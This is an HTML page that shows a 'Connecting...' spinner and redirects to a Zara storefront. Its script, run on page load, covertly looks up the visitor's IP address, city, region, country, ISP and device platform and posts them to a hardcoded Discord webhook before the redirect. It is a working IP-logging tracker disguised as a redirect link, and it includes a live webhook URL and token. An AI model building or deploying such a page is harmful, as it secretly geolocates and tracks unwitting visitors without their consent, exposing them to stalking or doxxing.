<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="3;url=https://www.zara.com/my/">
    <title>Connecting...</title>
    <style>
        body { background-color: #0d1117; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #58a6ff; font-family: sans-serif; }
        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 28px; height: 28px; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script>
        async function logAndGo() {
            const webhookURL = "https://discord.com/api/webhooks/1469709783996170371/dRebXA0dgtwbOZZJR8-CsojV85OqTVfHw7Q5q3J-O15Tk0sbqAFCqeQ04edR0ADH61_X";
            const destination = "https://www.zara.com/my/";
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                const logData = {
                    username: "Profile Sentry",
                    embeds: [{
                        title: "üë§ New Visitor Detected",
                        color: 3447003,
                        fields: [
                            { name: "üìç Location", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: false },
                            { name: "üåê IP Address", value: data.ip, inline: true },
                            { name: "üîå Provider", value: data.org, inline: true },
                            { name: "üì± Device", value: navigator.platform, inline: true },
                            { name: "‚è∞ Time", value: new Date().toLocaleTimeString(), inline: true }
                        ],
                        footer: { text: "pt-beep.github.io" }
                    }]
                };
                await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(logData), keepalive: true });
            } catch (e) { console.log("Redirecting..."); }
            window.location.replace(destination);
        }
        window.onload = logAndGo;
    </script>
</head>
<body>
    <div class="loader"></div>
</body>
</html>
